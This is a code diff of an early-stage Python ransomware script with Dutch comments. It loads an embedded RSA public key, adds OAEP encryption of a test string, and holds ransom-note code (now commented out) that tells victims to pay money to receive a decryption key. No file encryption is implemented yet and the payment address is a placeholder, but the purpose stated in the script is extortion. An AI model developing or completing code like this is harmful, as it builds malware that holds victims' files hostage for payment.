@@ -3,6 +3,7 @@ import hashlib
 from getmac import get_mac_address as gma
 import Crypto
 from Crypto.PublicKey import RSA
+from Crypto.Cipher import PKCS1_OAEP
 
 #Publiek key maken, en in een RSA key functie zetten.
 Pub_key = "-----BEGIN PUBLIC KEY-----\n\
@@ -15,11 +16,17 @@ JMkhnrM1jzR9BmEkRpYiNtt8Du2JEd7kfxJ/lSWcKVVmXpgpcmpC+FYq1BPy+BWY\n\
 iQIDAQAB\n\
 -----END PUBLIC KEY-----"
 RSA_key = RSA.import_key(Pub_key)
+cipher_rsa = PKCS1_OAEP.new(RSA_key)
+
+#SANDER!!!! HIER BEGINNEN :)
+Data = "Dit is data"
+Encrypt_data = cipher_rsa.encrypt(Data.encode("utf-8"))
+print(Encrypt_data)
 
 #Readme aanmaken.
-Readme = open("README.txt","w")
-Readme.write("Hallo! Je hebt encryptiesoftware geactiveerd!\n Om je bestanden tedecrypten moet je geld overmaken naar XXX.\n Dan zal je de decryptkey ontvangen!")
-Readme.close()
+#Readme = open("README.txt","w")
+#Readme.write("Hallo! Je hebt encryptiesoftware geactiveerd!\n Om je bestanden tedecrypten moet je geld overmaken naar XXX.\n Dan zal je de decryptkey ontvangen!")
+#Readme.close()
 
 #Endstage
 print("Code 200!")
